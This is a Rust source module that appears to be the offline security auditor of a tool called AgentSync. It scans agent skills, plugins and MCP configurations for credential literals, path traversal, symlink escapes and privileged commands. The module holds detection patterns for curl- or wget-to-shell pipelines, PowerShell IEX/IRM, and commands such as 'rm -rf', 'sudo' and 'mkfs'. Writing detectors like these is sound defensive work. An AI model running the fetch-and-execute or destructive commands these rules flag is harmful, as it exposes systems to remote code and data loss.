//! Static security audit for AgentSync-managed configuration.
//!
//! This module provides read-only, offline analysis of skills, plugins, and MCP
//! configurations to detect credential exposure, risky shell patterns, file traversal
//! issues, and unexpected privilege escalation. It uses the shared `Diagnostic` schema
//! from `src/diagnostics.rs` and never executes code or accesses the network.

use crate::config::{Config, McpServerConfig};
use crate::diagnostics::{
    BoundedTraversal, DEFAULT_MAX_CONTENT_SIZE, DEFAULT_MAX_FILE_SIZE, DEFAULT_MAX_FILES,
    DEFAULT_MAX_TRAVERSAL_DEPTH, DEFAULT_MAX_TRAVERSAL_ENTRIES, Diagnostic, DiagnosticReport,
    ScanCoverage, ScanError, ScanErrorCode, ScanStatus, Severity, Span, ValidationRule,
};
use crate::plugins::{PluginAuditSnapshot, PluginManager, PluginMcpApproval};
use crate::secrets::{
    SecretClassification, classify_value, is_environment_reference,
    is_header_environment_reference, is_sensitive_key,
};
use sha2::{Digest, Sha256};
use std::collections::{HashMap, VecDeque};
use std::path::{Path, PathBuf};

/// Detects credential-like literals in configuration files.
pub struct CredentialLiteralRule {
    _root: PathBuf,
}

impl CredentialLiteralRule {
    pub fn new(root: &Path) -> Self {
        Self {
            _root: root.to_path_buf(),
        }
    }
}

impl ValidationRule for CredentialLiteralRule {
    fn rule_id(&self) -> &str {
        "credential-literal"
    }

    fn default_severity(&self) -> Severity {
        Severity::Error
    }

    fn check_file(&self, path: &Path, content: &[u8]) -> Vec<Diagnostic> {
        let mut diagnostics = Vec::new();
        let Ok(text) = std::str::from_utf8(content) else {
            return diagnostics;
        };

        let extension = audit_extension(path);
        let root = &self._root;
        if let Some(extension @ ("json" | "yaml" | "yml" | "toml")) = extension.as_deref()
            && let Some(value) = parse_structured_value(extension, text)
        {
            let mut locations = CredentialLocationIndex::new(text, extension);
            collect_structured_credentials(&value, &mut |key, value| {
                if is_literal_sensitive_value(key, value) && looks_like_secret(value) {
                    let line = locations.line_for_key(key, value);
                    diagnostics.push(credential_diagnostic(root, path, key, line));
                }
            });
            return diagnostics;
        }

        if !matches!(
            extension.as_deref(),
            Some(
                "md" | "mdx"
                    | "txt"
                    | "sh"
                    | "bash"
                    | "zsh"
                    | "ps1"
                    | "bat"
                    | "cmd"
                    | "js"
                    | "ts"
                    | "py"
                    | "rb"
                    | "pl"
                    | "conf"
                    | "ini"
                    | "env"
            )
        ) {
            return diagnostics;
        }

        for (line_idx, line) in text.lines().enumerate() {
            let trimmed = line.trim();

            // Skip comments
            if trimmed.starts_with('#') || trimmed.starts_with("//") {
                continue;
            }

            if let Some((key, value)) = parse_text_assignment(line)
                && is_literal_sensitive_value(&key, &value)
                && looks_like_secret(&value)
            {
                diagnostics.push(credential_diagnostic(
                    root,
                    path,
                    &key,
                    (line_idx + 1) as u32,
                ));
            }
        }

        diagnostics
    }
}

fn parse_structured_value(extension: &str, text: &str) -> Option<serde_json::Value> {
    match extension {
        "json" => serde_json::from_str(text).ok(),
        "yaml" | "yml" => serde_saphyr::from_str(text).ok(),
        "toml" => toml::from_str::<toml::Value>(text)
            .ok()
            .and_then(|value| serde_json::to_value(value).ok()),
        _ => None,
    }
}

fn collect_structured_credentials(value: &serde_json::Value, visit: &mut impl FnMut(&str, &str)) {
    match value {
        serde_json::Value::Object(fields) => {
            for (key, value) in fields {
                if is_sensitive_key(key)
                    && let serde_json::Value::String(value) = value
                {
                    visit(key, value);
                }
                collect_structured_credentials(value, visit);
            }
        }
        serde_json::Value::Array(values) => {
            for value in values {
                collect_structured_credentials(value, visit);
            }
        }
        _ => {}
    }
}

struct CredentialLocationIndex {
    locations: HashMap<String, VecDeque<u32>>,
    locations_by_value: HashMap<(String, String), VecDeque<u32>>,
}

impl CredentialLocationIndex {
    fn new(text: &str, extension: &str) -> Self {
        let mut locations = HashMap::<String, VecDeque<u32>>::new();
        let mut locations_by_value = HashMap::<(String, String), VecDeque<u32>>::new();
        for (index, line) in text.lines().enumerate() {
            let line_number = (index + 1) as u32;
            let assignments = if extension == "json" {
                json_string_assignments(line)
            } else {
                parse_text_assignment(line).into_iter().collect()
            };
            for (key, value) in assignments {
                let key = decode_structured_scalar(&key).to_ascii_lowercase();
                let value = decode_structured_scalar(&value);
                locations
                    .entry(key.clone())
                    .or_default()
                    .push_back(line_number);
                locations_by_value
                    .entry((key, fingerprint_key(&value)))
                    .or_default()
                    .push_back(line_number);
            }
        }
        Self {
            locations,
            locations_by_value,
        }
    }

    fn line_for_key(&mut self, key: &str, value: &str) -> u32 {
        let key = key.to_ascii_lowercase();
        let value_key = (key.clone(), fingerprint_key(value));
        if let Some(line) = self
            .locations_by_value
            .get_mut(&value_key)
            .and_then(VecDeque::pop_front)
        {
            if let Some(locations) = self.locations.get_mut(&key) {
                locations.retain(|candidate| *candidate != line);
            }
            return line;
        }
        self.locations
            .get_mut(&key)
            .and_then(VecDeque::pop_front)
            .unwrap_or(1)
    }
}

fn decode_structured_scalar(value: &str) -> String {
    serde_json::from_str::<String>(&format!("\"{value}\"")).unwrap_or_else(|_| value.to_string())
}

fn json_string_assignments(line: &str) -> Vec<(String, String)> {
    let bytes = line.as_bytes();
    let mut assignments = Vec::new();
    let mut cursor = 0;
    while cursor < bytes.len() {
        if bytes[cursor] != b'"' {
            cursor += 1;
            continue;
        }
        let Some((key, after_key)) = json_string_at(line, cursor) else {
            cursor += 1;
            continue;
        };
        cursor = after_key;
        let mut value_start = cursor;
        while bytes.get(value_start).is_some_and(u8::is_ascii_whitespace) {
            value_start += 1;
        }
        if bytes.get(value_start) != Some(&b':') {
            continue;
        }
        value_start += 1;
        while bytes.get(value_start).is_some_and(u8::is_ascii_whitespace) {
            value_start += 1;
        }
        if bytes.get(value_start) != Some(&b'"') {
            continue;
        }
        if let Some((value, _)) = json_string_at(line, value_start) {
            assignments.push((key, value));
        }
    }
    assignments
}

fn json_string_at(line: &str, start: usize) -> Option<(String, usize)> {
    let bytes = line.as_bytes();
    if bytes.get(start) != Some(&b'"') {
        return None;
    }
    let mut cursor = start + 1;
    let mut escaped = false;
    while let Some(byte) = bytes.get(cursor) {
        if escaped {
            escaped = false;
        } else if *byte == b'\\' {
            escaped = true;
        } else if *byte == b'"' {
            let end = cursor + 1;
            let value = serde_json::from_str(&line[start..end]).ok()?;
            return Some((value, end));
        }
        cursor += 1;
    }
    None
}

fn is_literal_sensitive_value(key: &str, value: &str) -> bool {
    matches!(
        classify_value(key, value),
        SecretClassification::OpaqueSensitiveLiteral
    ) && !is_header_environment_reference(value)
}

fn is_sensitive_mcp_argument(key: &str, value: &str) -> bool {
    let generic_key_flag = key.eq_ignore_ascii_case("key");
    (is_sensitive_key(key) || generic_key_flag)
        && if generic_key_flag && !is_sensitive_key(key) {
            !is_environment_reference(value) && !is_header_environment_reference(value)
        } else {
            is_literal_sensitive_value(key, value)
        }
        && looks_like_secret(value)
}

fn parse_text_assignment(line: &str) -> Option<(String, String)> {
    let mut assignment = line.trim();
    for prefix in ["export ", "const ", "let ", "var "] {
        if let Some(value) = assignment.strip_prefix(prefix) {
            assignment = value.trim_start();
            break;
        }
    }
    let separator = assignment.find(['=', ':'])?;
    let key = assignment[..separator]
        .trim()
        .trim_matches(['"', '\'', '`'])
        .to_string();
    if key.is_empty() {
        return None;
    }
    let mut value = assignment[separator + 1..].trim();
    if let Some(quote) = value
        .chars()
        .next()
        .filter(|character| matches!(character, '\'' | '"' | '`'))
    {
        value = value.strip_prefix(quote)?;
        value = value.split_once(quote).map_or(value, |(value, _)| value);
    } else {
        value = value
            .split_once(" #")
            .map_or(value, |(value, _)| value)
            .trim_end_matches([';', ',']);
    }
    Some((key, value.to_string()))
}

fn credential_diagnostic(root: &Path, path: &Path, key: &str, line: u32) -> Diagnostic {
    let relative_path = portable_path(root, path);
    Diagnostic {
        rule_id: "credential-literal".to_string(),
        target: None,
        severity: Severity::Error,
        source_path: relative_path.clone(),
        span: Some(Span::line(line)),
        message: "Potential credential literal in a sensitive key".to_string(),
        evidence: Some("Sensitive literal value is redacted".to_string()),
        fingerprint: fingerprint(
            "credential-literal",
            &relative_path,
            line,
            &fingerprint_key(key),
        ),
    }
}

/// Check if a value looks like a real secret rather than a placeholder.
fn looks_like_secret(value: &str) -> bool {
    let trimmed = value.trim().trim_matches('"').trim_matches('\'');

    // Skip empty values
    if trimmed.is_empty() {
        return false;
    }

    // Skip obvious placeholders
    let placeholders = [
        "your_",
        "placeholder",
        "example",
        "changeme",
        "xxx",
        "TODO",
        "FIXME",
    ];
    let lower = trimmed.to_lowercase();
    if placeholders.iter().any(|p| lower.contains(p)) {
        return false;
    }

    // Skip short values that are likely not secrets
    if trimmed.len() < 8 {
        return false;
    }

    // Skip values that are clearly environment references
    if is_environment_reference(trimmed) {
        return false;
    }

    true
}

/// Detects risky fetch-and-execute shell patterns.
pub struct FetchAndExecuteRule {
    _root: PathBuf,
}

impl FetchAndExecuteRule {
    pub fn new(root: &Path) -> Self {
        Self {
            _root: root.to_path_buf(),
        }
    }
}

impl ValidationRule for FetchAndExecuteRule {
    fn rule_id(&self) -> &str {
        "fetch-and-execute"
    }

    fn default_severity(&self) -> Severity {
        Severity::Warning
    }

    fn check_file(&self, path: &Path, content: &[u8]) -> Vec<Diagnostic> {
        let mut diagnostics = Vec::new();
        let Ok(text) = std::str::from_utf8(content) else {
            return diagnostics;
        };

        let extension = audit_extension(path);
        let markdown = matches!(extension.as_deref(), Some("md" | "mdx"));
        let structured_extension = extension
            .as_deref()
            .filter(|extension| matches!(*extension, "json" | "yaml" | "yml" | "toml"));
        if !markdown
            && structured_extension.is_none()
            && !matches!(
                extension.as_deref(),
                Some(
                    "sh" | "bash"
                        | "zsh"
                        | "ps1"
                        | "bat"
                        | "cmd"
                        | "txt"
                        | "env"
                        | "js"
                        | "ts"
                        | "py"
                        | "rb"
                        | "pl"
                        | "conf"
                        | "ini"
                )
            )
        {
            return diagnostics;
        }

        // Patterns that indicate fetch-and-execute (each tuple: list of substrings that must all be present)
        let patterns: &[(&[&str], &str)] = &[
            (&["curl", "|", "bash"], "curl piped to bash"),
            (&["curl", "|", "sh"], "curl piped to sh"),
            (&["wget", "|", "bash"], "wget piped to bash"),
            (&["wget", "|", "sh"], "wget piped to sh"),
            (
                &["curl", "-o", "&&", "bash"],
                "curl download followed by bash execution",
            ),
            (
                &["curl", "-o", "&&", "sh"],
                "curl download followed by sh execution",
            ),
            (
                &["invoke-expression", "invoke-webrequest"],
                "PowerShell Invoke-Expression with Invoke-WebRequest",
            ),
            (&["iex", "irm"], "PowerShell IEX with IRM"),
        ];

        let mut commands = Vec::<(u32, String)>::new();
        if let Some(extension) = structured_extension {
            let Some(value) = parse_structured_value(extension, text) else {
                return diagnostics;
            };
            let mut strings = Vec::new();
            collect_structured_strings(&value, &mut strings);
            for command in strings {
                let line = text
                    .lines()
                    .position(|source_line| source_line.contains(&command))
                    .map(|index| (index + 1) as u32)
                    .unwrap_or(1);
                commands.push((line, command));
            }
        } else {
            let lines = text.lines().collect::<Vec<_>>();
            let mut line_index = 0;
            while line_index < lines.len() {
                if !markdown && shell_comment_only(lines[line_index]) {
                    line_index += 1;
                    continue;
                }
                let first_line = line_index;
                let mut command = lines[line_index].trim_end().to_string();
                while command.trim_end().ends_with('\\') && line_index + 1 < lines.len() {
                    command.truncate(command.trim_end().len());
                    command.pop();
                    line_index += 1;
                    if line_index == lines.len()
                        || (!markdown && shell_comment_only(lines[line_index]))
                    {
                        break;
                    }
                    command.push(' ');
                    command.push_str(lines[line_index].trim());
                }
                commands.push(((first_line + 1) as u32, command));
                line_index += 1;
            }
        }

        for (line, command) in commands {
            let trimmed = command.trim_start_matches('>').trim().to_lowercase();
            if let Some((_, description)) = patterns
                .iter()
                .find(|(substrings, _)| substrings.iter().all(|part| trimmed.contains(*part)))
            {
                let relative_path = portable_path(&self._root, path);
                diagnostics.push(Diagnostic {
                    rule_id: self.rule_id().to_string(),
                    target: None,
                    severity: self.default_severity(),
                    source_path: relative_path.clone(),
                    span: Some(Span::line(line)),
                    message: format!("Risky fetch-and-execute pattern: {description}"),
                    evidence: Some(format!("Detected pattern: {description}")),
                    fingerprint: fingerprint(self.rule_id(), &relative_path, line, description),
                });
            }
        }

        diagnostics
    }
}

fn shell_comment_only(line: &str) -> bool {
    line.trim_start().starts_with('#')
}

fn collect_structured_strings(value: &serde_json::Value, strings: &mut Vec<String>) {
    match value {
        serde_json::Value::String(value) => strings.push(value.clone()),
        serde_json::Value::Object(fields) => {
            for value in fields.values() {
                collect_structured_strings(value, strings);
            }
        }
        serde_json::Value::Array(values) => {
            for value in values {
                collect_structured_strings(value, strings);
            }
        }
        _ => {}
    }
}

/// Detects file traversal and symlink escape attempts.
pub struct FileTraversalRule {
    root: PathBuf,
}

impl FileTraversalRule {
    pub fn new(root: &Path) -> Self {
        Self {
            root: root.to_path_buf(),
        }
    }
}

impl ValidationRule for FileTraversalRule {
    fn rule_id(&self) -> &str {
        "file-traversal"
    }

    fn default_severity(&self) -> Severity {
        Severity::Warning
    }

    fn check_file(&self, path: &Path, content: &[u8]) -> Vec<Diagnostic> {
        let mut diagnostics = Vec::new();
        let Ok(text) = std::str::from_utf8(content) else {
            return diagnostics;
        };

        let extension = audit_extension(path);
        let structured = extension
            .as_deref()
            .filter(|extension| matches!(*extension, "json" | "yaml" | "yml" | "toml"))
            .and_then(|extension| parse_structured_value(extension, text));
        let mut references = Vec::new();
        if let Some(value) = structured {
            collect_structured_file_references(&value, &mut references);
        } else {
            for (line_index, line) in text.lines().enumerate() {
                references.extend(
                    extract_file_references(line)
                        .into_iter()
                        .map(|reference| ((line_index + 1) as u32, reference)),
                );
            }
        }

        for (line, reference) in references {
            if !path_reference_escapes_root(&self.root, path, &reference) {
                continue;
            }
            let relative_path = portable_path(&self.root, path);
            diagnostics.push(Diagnostic {
                rule_id: self.rule_id().to_string(),
                target: None,
                severity: self.default_severity(),
                source_path: relative_path.clone(),
                span: Some(Span::line(line)),
                message: "Referenced file path escapes or crosses an untrusted link".to_string(),
                evidence: Some("File reference is outside the authorized target".to_string()),
                fingerprint: fingerprint(
                    self.rule_id(),
                    &relative_path,
                    line,
                    "unauthorized-file-reference",
                ),
            });
            break;
        }

        diagnostics
    }
}

fn collect_structured_file_references(
    value: &serde_json::Value,
    references: &mut Vec<(u32, String)>,
) {
    match value {
        serde_json::Value::Object(fields) => {
            for (key, value) in fields {
                let normalized_key = key.to_ascii_lowercase();
                if matches!(
                    normalized_key.as_str(),
                    "path" | "file" | "include" | "href" | "src" | "reference" | "source"
                ) && let serde_json::Value::String(reference) = value
                {
                    references.push((1, reference.clone()));
                }
                collect_structured_file_references(value, references);
            }
        }
        serde_json::Value::Array(values) => {
            for value in values {
                collect_structured_file_references(value, references);
            }
        }
        _ => {}
    }
}

fn extract_file_references(line: &str) -> Vec<String> {
    let mut references = Vec::new();
    let mut remaining = line;
    while let Some(link_start) = remaining.find("](") {
        let target_start = link_start + 2;
        let Some(target_end) = remaining[target_start..].find(')') else {
            break;
        };
        let target = remaining[target_start..target_start + target_end]
            .split_whitespace()
            .next()
            .unwrap_or_default()
            .trim_matches(['<', '>', '\'', '"']);
        if !target.is_empty() {
            references.push(target.to_string());
        }
        remaining = &remaining[target_start + target_end + 1..];
    }

    for token in line.split_whitespace() {
        let candidate = token.trim_matches([
            '(', ')', '[', ']', '{', '}', '<', '>', '\'', '"', '`', ',', ';',
        ]);
        if (candidate.starts_with("./")
            || candidate.starts_with("../")
            || candidate.starts_with("..\\")
            || (candidate.starts_with('/') && !candidate.starts_with("//")))
            && candidate
                .chars()
                .any(|character| character != '.' && character != '/')
        {
            references.push(candidate.to_string());
        }
    }

    references
}

fn path_reference_escapes_root(root: &Path, source_path: &Path, reference: &str) -> bool {
    if reference.starts_with("http://")
        || reference.starts_with("https://")
        || reference.starts_with("mailto:")
        || reference.starts_with('#')
        || reference.starts_with('$')
    {
        return false;
    }

    let reference_path = Path::new(reference);
    let relative_path = if reference_path.is_absolute() {
        let Ok(relative_path) = reference_path.strip_prefix(root) else {
            return true;
        };
        relative_path.to_path_buf()
    } else {
        let Some(parent) = source_path.parent() else {
            return true;
        };
        let Ok(parent) = parent.strip_prefix(root) else {
            return true;
        };
        parent.join(reference_path)
    };

    let mut components = Vec::new();
    for component in relative_path.components() {
        match component {
            std::path::Component::CurDir => {}
            std::path::Component::ParentDir => {
                if components.pop().is_none() {
                    return true;
                }
            }
            std::path::Component::Normal(component) => {
                components.push(component.to_os_string());
                let mut candidate = root.to_path_buf();
                candidate.extend(&components);
                match std::fs::symlink_metadata(candidate) {
                    Ok(metadata) if metadata.file_type().is_symlink() => return true,
                    Ok(_) => {}
                    Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
                    Err(_) => return true,
                }
            }
            std::path::Component::RootDir | std::path::Component::Prefix(_) => return true,
        }
    }
    false
}

/// Detects unexpected MCP server privilege escalation.
pub struct McpPrivilegeRule {
    _root: PathBuf,
}

impl McpPrivilegeRule {
    pub fn new(root: &Path) -> Self {
        Self {
            _root: root.to_path_buf(),
        }
    }
}

impl ValidationRule for McpPrivilegeRule {
    fn rule_id(&self) -> &str {
        "mcp-privilege"
    }

    fn default_severity(&self) -> Severity {
        Severity::Warning
    }

    fn check_file(&self, path: &Path, content: &[u8]) -> Vec<Diagnostic> {
        let mut diagnostics = Vec::new();
        let Some(extension) = audit_extension(path) else {
            return diagnostics;
        };
        let Ok(text) = std::str::from_utf8(content) else {
            return diagnostics;
        };
        let Some(value) = parse_structured_value(&extension, text) else {
            return diagnostics;
        };
        let Some(servers) = value
            .get("mcpServers")
            .or_else(|| value.get("mcp_servers"))
            .and_then(serde_json::Value::as_object)
        else {
            return diagnostics;
        };

        let source_path = portable_path(&self._root, path);
        for (name, value) in servers {
            let Ok(server) = serde_json::from_value::<McpServerConfig>(value.clone()) else {
                continue;
            };
            diagnostics.extend(
                audit_mcp_server_state(name, &server, &source_path, PluginMcpApproval::Allowed)
                    .into_iter()
                    .filter(should_include_mcp_state_finding),
            );
        }

        diagnostics
    }
}

/// Audit MCP server configuration for credential exposure.
pub fn audit_mcp_server(
    name: &str,
    server: &McpServerConfig,
    source_path: &str,
) -> Vec<Diagnostic> {
    let mut diagnostics = Vec::new();
    let server_key = fingerprint_key(name);

    // Check env values
    for (key, value) in &server.env {
        if is_sensitive_key(key)
            && matches!(
                classify_value(key, value),
                SecretClassification::OpaqueSensitiveLiteral
            )
        {
            diagnostics.push(Diagnostic {
                rule_id: "credential-literal".to_string(),
                target: None,
                severity: Severity::Error,
                source_path: source_path.to_string(),
                span: None,
                message: "MCP declaration contains a literal value for a sensitive environment key"
                    .to_string(),
                evidence: Some("Sensitive value is redacted".to_string()),
                fingerprint: fingerprint(
                    "credential-literal",
                    source_path,
                    0,
                    &format!("server:{server_key}\0env:{}", fingerprint_key(key)),
                ),
            });
        }
    }

    // Check headers
    for (key, value) in &server.headers {
        if is_sensitive_key(key)
            && matches!(
                classify_value(key, value),
                SecretClassification::OpaqueSensitiveLiteral
            )
            && !is_header_environment_reference(value)
        {
            diagnostics.push(Diagnostic {
                rule_id: "credential-literal".to_string(),
                target: None,
                severity: Severity::Error,
                source_path: source_path.to_string(),
                span: None,
                message: "MCP declaration contains a literal value for a sensitive header key"
                    .to_string(),
                evidence: Some("Sensitive value is redacted".to_string()),
                fingerprint: fingerprint(
                    "credential-literal",
                    source_path,
                    0,
                    &format!("server:{server_key}\0header:{}", fingerprint_key(key)),
                ),
            });
        }
    }

    // Check args
    let mut argument_index = 0;
    while argument_index < server.args.len() {
        let Some(option) = server.args[argument_index].strip_prefix("--") else {
            argument_index += 1;
            continue;
        };
        let (key, value, consumed_next) = if let Some((key, value)) = option.split_once('=') {
            (key, value, false)
        } else if let Some(value) = server.args.get(argument_index + 1)
            && !value.starts_with("--")
        {
            (option, value.as_str(), true)
        } else {
            argument_index += 1;
            continue;
        };

        if is_sensitive_mcp_argument(key, value) {
            diagnostics.push(Diagnostic {
                rule_id: "credential-literal".to_string(),
                target: None,
                severity: Severity::Warning,
                source_path: source_path.to_string(),
                span: None,
                message: "MCP command arguments may contain a literal secret".to_string(),
                evidence: Some("Argument value is redacted".to_string()),
                fingerprint: fingerprint(
                    "credential-literal",
                    source_path,
                    0,
                    &format!("server:{server_key}\0args:{}", fingerprint_key(key)),
                ),
            });
        }
        argument_index += if consumed_next { 2 } else { 1 };
    }

    diagnostics
}

pub fn audit_mcp_server_state(
    name: &str,
    server: &McpServerConfig,
    source_path: &str,
    approval: PluginMcpApproval,
) -> Vec<Diagnostic> {
    let mut diagnostics = audit_mcp_server(name, server, source_path);
    if matches!(approval, PluginMcpApproval::Pending) {
        diagnostics.push(Diagnostic {
            rule_id: "mcp-approval-pending".to_string(),
            target: None,
            severity: Severity::Warning,
            source_path: source_path.to_string(),
            span: None,
            message: "Plugin MCP server has not been explicitly approved".to_string(),
            evidence: Some("MCP approval is pending".to_string()),
            fingerprint: fingerprint(
                "mcp-approval-pending",
                source_path,
                0,
                &fingerprint_key(name),
            ),
        });
    }

    let command = server.command.as_deref().unwrap_or_default();
    let command_and_args = format!("{command} {}", server.args.join(" ")).to_ascii_lowercase();
    let dangerous_patterns = ["sudo", "rm -rf", "chmod", "chown", "mkfs"];
    if dangerous_patterns
        .iter()
        .any(|pattern| command_and_args.contains(pattern))
    {
        diagnostics.push(Diagnostic {
            rule_id: "mcp-privilege".to_string(),
            target: None,
            severity: Severity::Warning,
            source_path: source_path.to_string(),
            span: None,
            message: "MCP server command contains a potentially privileged operation".to_string(),
            evidence: Some("Structured command declaration matched a privilege rule".to_string()),
            fingerprint: fingerprint("mcp-privilege", source_path, 0, &fingerprint_key(name)),
        });
    }
    diagnostics
}

fn should_include_mcp_state_finding(finding: &Diagnostic) -> bool {
    finding.rule_id == "mcp-privilege"
        || finding.rule_id == "mcp-approval-pending"
        || (finding.rule_id == "credential-literal"
            && finding.message == "MCP command arguments may contain a literal secret")
}

fn fingerprint_key(key: &str) -> String {
    let digest = Sha256::digest(key.as_bytes());
    digest.iter().map(|byte| format!("{byte:02x}")).collect()
}

/// Run all audit rules on a directory.
pub fn audit_directory(root: &Path) -> DiagnosticReport {
    audit_directory_inner(root, None)
}

pub fn audit_directory_for_target(root: &Path, target: &str) -> DiagnosticReport {
    audit_directory_inner(root, Some(target))
}

fn audit_directory_inner(root: &Path, target: Option<&str>) -> DiagnosticReport {
    let mut all_diagnostics = Vec::new();
    let mut unsupported_errors = Vec::new();
    let mut unsupported_files = 0;

    let rules: Vec<Box<dyn ValidationRule>> = vec![
        Box::new(CredentialLiteralRule::new(root)),
        Box::new(FetchAndExecuteRule::new(root)),
        Box::new(FileTraversalRule::new(root)),
        Box::new(McpPrivilegeRule::new(root)),
    ];

    let traversal = BoundedTraversal::new();

    let traversal_report = traversal.traverse_with_report(root, |path, content| {
        if let Some(code) = unsupported_content(path, content) {
            unsupported_files += 1;
            unsupported_errors.push(ScanError::new(code, Some(portable_path(root, path))));
            return true;
        }
        for rule in &rules {
            let diagnostics = rule.check_file(path, content);
            all_diagnostics.extend(diagnostics);
        }
        true
    });

    let mut coverage = traversal_report.coverage;
    coverage.files_scanned = coverage.files_scanned.saturating_sub(unsupported_files);
    coverage.files_skipped += unsupported_files;

    let mut scan_errors = traversal_report.errors;
    scan_errors.extend(unsupported_errors);
    scan_errors.sort_by(|left, right| {
        left.source_path
            .cmp(&right.source_path)
            .then_with(|| left.code.cmp(&right.code))
    });
    let status = if scan_errors.is_empty() {
        ScanStatus::Complete
    } else {
        ScanStatus::Incomplete
    };

    let root_metadata = std::fs::symlink_metadata(root);
    let targets_discovered = usize::from(root_metadata.is_ok());
    let target_scan_started = root_metadata
        .map(|metadata| metadata.is_dir() && !metadata.file_type().is_symlink())
        .unwrap_or(false)
        && !scan_errors
            .iter()
            .any(|error| error.code == crate::diagnostics::ScanErrorCode::RootReadFailed);
    let targets_scanned = usize::from(target_scan_started);
    for diagnostic in &mut all_diagnostics {
        if let Some(target) = target {
            let original_fingerprint = std::mem::take(&mut diagnostic.fingerprint);
            let line = diagnostic
                .span
                .as_ref()
                .map(|span| span.line)
                .unwrap_or_default();
            diagnostic.fingerprint = fingerprint(
                &diagnostic.rule_id,
                &diagnostic.source_path,
                line,
                &format!("{target}\0{original_fingerprint}"),
            );
            diagnostic.target = Some(target.to_string());
        }
    }
    for error in &mut scan_errors {
        if let Some(target) = target {
            error.target = Some(target.to_string());
        }
    }
    DiagnosticReport::with_scan(
        all_diagnostics,
        status,
        ScanCoverage {
            targets_discovered,
            targets_scanned,
            files_discovered: coverage.files_discovered,
            files_scanned: coverage.files_scanned,
            files_skipped: coverage.files_skipped,
            bytes_scanned: coverage.bytes_scanned,
        },
        scan_errors,
    )
}

pub fn audit_plugin_selection(project_root: &Path, selection: &str) -> DiagnosticReport {
    let target = format!("plugin/{selection}");
    match inspect_plugin_inventory(project_root, Some(selection)) {
        Ok((snapshots, _)) if !snapshots.is_empty() => aggregate_plugin_snapshots(snapshots),
        _ => incomplete_scan_report(
            ScanError::new(ScanErrorCode::PluginTrustUnavailable, None).with_target(target),
        ),
    }
}

pub fn audit_all(project_root: &Path) -> DiagnosticReport {
    let mut findings = Vec::new();
    let mut scan_errors = Vec::new();
    let mut coverage = ScanCoverage::default();

    match std::fs::symlink_metadata(project_root) {
        Ok(metadata) if metadata.file_type().is_symlink() => {
            return incomplete_scan_report(ScanError::new(ScanErrorCode::SymlinkSkipped, None));
        }
        Ok(metadata) if !metadata.is_dir() => {
            return incomplete_scan_report(ScanError::new(ScanErrorCode::RootReadFailed, None));
        }
        Ok(_) => {}
        Err(_) => {
            return incomplete_scan_report(ScanError::new(ScanErrorCode::RootReadFailed, None));
        }
    }

    let agents_root = project_root.join(".agents");
    match std::fs::symlink_metadata(&agents_root) {
        Ok(metadata) if metadata.file_type().is_symlink() => scan_errors.push(ScanError::new(
            ScanErrorCode::SymlinkSkipped,
            Some(".agents".to_string()),
        )),
        Ok(metadata) if !metadata.is_dir() => scan_errors.push(ScanError::new(
            ScanErrorCode::RootReadFailed,
            Some(".agents".to_string()),
        )),
        Ok(_) => {
            let skills_root = agents_root.join("skills");
            match std::fs::symlink_metadata(&skills_root) {
                Ok(metadata) if metadata.file_type().is_symlink() => {
                    scan_errors.push(ScanError::new(
                        ScanErrorCode::SymlinkSkipped,
                        Some("skills".to_string()),
                    ));
                }
                Ok(metadata) if metadata.is_dir() => match std::fs::read_dir(&skills_root) {
                    Ok(entries) => {
                        let mut entries = collect_skill_entries(entries, &mut scan_errors);
                        entries.sort_by_key(|entry| entry.file_name());
                        for entry in entries {
                            let name = entry.file_name().to_string_lossy().to_string();
                            let metadata = match std::fs::symlink_metadata(entry.path()) {
                                Ok(metadata) => metadata,
                                Err(_) => {
                                    scan_errors.push(ScanError::new(
                                        ScanErrorCode::DirectoryReadFailed,
                                        Some("skills".to_string()),
                                    ));
                                    continue;
                                }
                            };
                            if metadata.file_type().is_symlink() {
                                coverage.targets_discovered += 1;
                                scan_errors.push(ScanError::new(
                                    ScanErrorCode::SymlinkSkipped,
                                    Some("skills".to_string()),
                                ));
                                continue;
                            }
                            if !metadata.is_dir() {
                                continue;
                            }
                            if !valid_target_component(&name) {
                                coverage.targets_discovered += 1;
                                scan_errors.push(ScanError::new(
                                    ScanErrorCode::InvalidTarget,
                                    Some("skills".to_string()),
                                ));
                                continue;
                            }
                            let target = format!("skill/{name}");
                            let report = audit_directory_for_target(&entry.path(), &target);
                            merge_report(report, &mut findings, &mut scan_errors, &mut coverage);
                        }
                    }
                    Err(_) => scan_errors.push(ScanError::new(
                        ScanErrorCode::DirectoryReadFailed,
                        Some("skills".to_string()),
                    )),
                },
                Ok(_) => scan_errors.push(ScanError::new(
                    ScanErrorCode::DirectoryReadFailed,
                    Some("skills".to_string()),
                )),
                Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
                Err(_) => scan_errors.push(ScanError::new(
                    ScanErrorCode::DirectoryReadFailed,
                    Some("skills".to_string()),
                )),
            }
        }
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
        Err(_) => scan_errors.push(ScanError::new(
            ScanErrorCode::RootReadFailed,
            Some(".agents".to_string()),
        )),
    }

    match inspect_plugin_inventory(project_root, None) {
        Ok((snapshots, config)) => {
            let plugin_report = aggregate_plugin_snapshots(snapshots);
            merge_report(
                plugin_report,
                &mut findings,
                &mut scan_errors,
                &mut coverage,
            );
            if let Some(config) = config {
                for (name, server) in &config.mcp_servers {
                    let target = format!("mcp/{}", fingerprint_key(name));
                    let mut diagnostics = audit_mcp_server_state(
                        name,
                        server,
                        "agentsync.toml",
                        PluginMcpApproval::Allowed,
                    );
                    apply_target(&mut diagnostics, &target);
                    findings.extend(diagnostics);
                    coverage.targets_discovered += 1;
                    coverage.targets_scanned += 1;
                }
            }
        }
        Err(_) => scan_errors.push(ScanError::new(ScanErrorCode::PluginTrustUnavailable, None)),
    }

    finish_scan_report(findings, coverage, scan_errors)
}

fn inspect_plugin_inventory(
    project_root: &Path,
    selection: Option<&str>,
) -> anyhow::Result<(Vec<PluginAuditSnapshot>, Option<Config>)> {
    let agents_root = project_root.join(".agents");
    let agents_metadata = std::fs::symlink_metadata(&agents_root);
    if agents_metadata
        .as_ref()
        .is_ok_and(|metadata| metadata.file_type().is_symlink())
    {
        anyhow::bail!("plugin configuration root is not trusted");
    }

    let candidates = [
        agents_root.join("agentsync.toml"),
        project_root.join("agentsync.toml"),
    ];
    let mut config_path = None;
    for candidate in candidates {
        match std::fs::symlink_metadata(&candidate) {
            Ok(metadata) if metadata.file_type().is_symlink() || !metadata.is_file() => {
                anyhow::bail!("plugin configuration file is not trusted");
            }
            Ok(_) => {
                config_path = Some(candidate);
                break;
            }
